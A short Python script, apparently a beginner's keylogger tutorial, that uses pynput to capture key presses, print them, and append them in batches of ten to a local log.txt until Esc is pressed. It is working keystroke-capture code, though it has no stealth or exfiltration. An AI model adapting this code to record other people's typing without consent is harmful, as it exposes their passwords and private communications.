from pynput.keyboard import Key, Listener

count = 0
keys = []

#recognises when you press a key
def on_press(key):
  global keys, count
  
  keys.append(key)
  count += 1
  print("{0} pressed".format(key))

#if you counted 10 keys, write it in the file and reset the key list 
  if count >=10:
    count = 0 
    write_file(keys)
    keys = []

#makes a file called log.txt. then use w the first time so it writes a file, if you have one use a
def write_file(keys):
  with open ("log.txt", "a") as f:
    for key in keys:
      #exchange '2' to 2 -> format the writing
      k = str(key).replace("'", "")
      #make a new line for every word 
      if k .find("space") > 0:
        f.write('\n')
        #we dont want to have Key.tab. so we change that
      elif k.find("Key") == -1:
        f.write(k)

#writes it when you release the key (to break out of the loop)
def on_release(key):
  if key == Key.esc:
    return False

# make the listener. on_press = key pressed, on_release = key is released
with Listener (on_press=on_press, on_release=on_release) as listener:
  listener.join()